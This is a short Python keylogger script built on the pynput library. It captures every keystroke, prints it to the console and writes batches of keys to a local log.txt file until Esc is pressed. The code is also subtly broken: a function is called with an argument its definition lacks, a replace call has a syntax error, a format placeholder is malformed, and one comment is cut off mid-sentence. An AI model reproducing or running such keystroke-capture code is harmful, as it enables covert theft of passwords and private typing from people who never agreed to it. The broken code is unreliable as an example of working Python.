import pynput

from pynput.keyboard import Key, Listener

# Count is how often we are going to update the file. `if count >= 110 
count = 0
keys = []

def on_press(key): 
    global keys, count

    keys.append(key)
    count += 1
    print("(0) pressed".format(key))

    if count >= 50:
        count = 0
        write_file(keys)
        keys = []

def write_file():
    with open("log.txt", "a") as f: 
        for key in keys:
            k = str(key).replace("'"."")
            if k.find("space") > 0: 
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
